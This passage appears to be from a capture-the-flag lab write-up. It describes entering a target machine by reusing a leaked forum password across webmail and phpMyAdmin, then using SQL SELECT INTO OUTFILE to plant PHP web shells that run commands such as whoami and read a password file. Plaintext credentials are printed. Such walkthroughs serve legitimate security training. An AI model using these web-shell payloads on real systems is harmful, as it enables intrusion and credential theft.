## Path 4 - Entry via web services
After using nmap to get information about services running which are facing to the web, I used gobuster to enumerate the directories which can be accessed.

Below is the enumeration for the HTTPS port
![image](https://hackmd.io/_uploads/HyOK-Id46.png)

Below is the enumeration for the HTTP port
![image](https://hackmd.io/_uploads/ryK2ZId4p.png)

There are a few services we can access from the HTTPS endpoint, like `/forum`, `/phpmyadmin` and `/webmail`. I first went to the forum to see what is it.

I was greeted with a reddit like forum like below, however I noticed an intresting topic regarding login failure
![image](https://hackmd.io/_uploads/H1gPMLOE6.png)

I did find a password-like string in the post, So im trying to use that password `!q\]Ej?*5K5cy*AJ` to login to various users on the platform.
![image](https://hackmd.io/_uploads/HyJVQIOEa.png)

I used the password on user lmezard and I was able to login to his account on the forum.
![image](https://hackmd.io/_uploads/HJDFXIdVa.png)

![image](https://hackmd.io/_uploads/ByvTrLdEa.png)

I found his email address and I went to the webmail service to log in using that address and password; and I see some intresting stuff

![image](https://hackmd.io/_uploads/r1sJIIOVp.png)
![image](https://hackmd.io/_uploads/SJLNI8uNa.png)

I went to phpmyadmin and tried the credentials `root/Fg-'kKXBj87E:aJ$`, and I am able to access the dashboard as root.
![image](https://hackmd.io/_uploads/S16Y8LON6.png)

At this point, I have tried deciphering the passwords and whatnot, but I seem to fail to determine the exact encryption method of the passwords. But I stumbled upon this [article](https://www.informit.com/articles/article.aspx?p=1407358&seqNum=2) that gave me directions on how to move forward. 

As the article suggests, we can actually use the MYSQL executor in phpmyadmin to write create new files nad write content to them using `SELECT INTO OUTFILE`, which is originally made to serve as a convinience tool to quickly parse sql results into files. However, we can also write our own content into the outfile as long as it does not get changed by the query itself.

And since the service is running in apache with php, which means we can access php files in the browser and it will execute the file to return the web content. With that said, the strategy is to execute something using the browser, and we can specify the things we want to execute with the `SELECT INTO OUTFILE` on phpmyadmin.

For a proof of concept, we can try to execute this sql statement
```sql=
SELECT "<?php $output = shell_exec('whoami'); echo $output  ?>" INTO OUTFILE "/var/www/forum/whoami.php;"
```

We should be able to head to `ipaddr/forum/whoami.php` and see the output of the command `whoami`. But it turns out I dont have permissions to write to that folder.
![image](https://hackmd.io/_uploads/SJqSl1KVp.png)

I went to the [source](https://github.com/My-Little-Forum/mylittleforum) code for the forum page they are using and found out there are other directories like `backups, config, images...` and turns out I can access the `templates_c` directory
![image](https://hackmd.io/_uploads/S1QYW1YET.png)

So i changed my script to write in the images directory instead
```sql=
SELECT "<?php $output = shell_exec('whoami'); echo $output  ?>" INTO OUTFILE "/var/www/forum/templates_c/whoami.php";
```

and I got the result when running the php file.
![image](https://hackmd.io/_uploads/Bk8EMJF4a.png)

After some searching around with this command, I am able to get the password to the lmezard machine 
```sql=
SELECT "<?php $output = shell_exec('cat /home/LOOKATME/password'); echo $output  ?>" INTO OUTFILE "/var/www/forum/templates_c/lookatme.php";
```

![image](https://hackmd.io/_uploads/rJIoM1FEp.png)

**Refer to part 1 for the rest of the steps**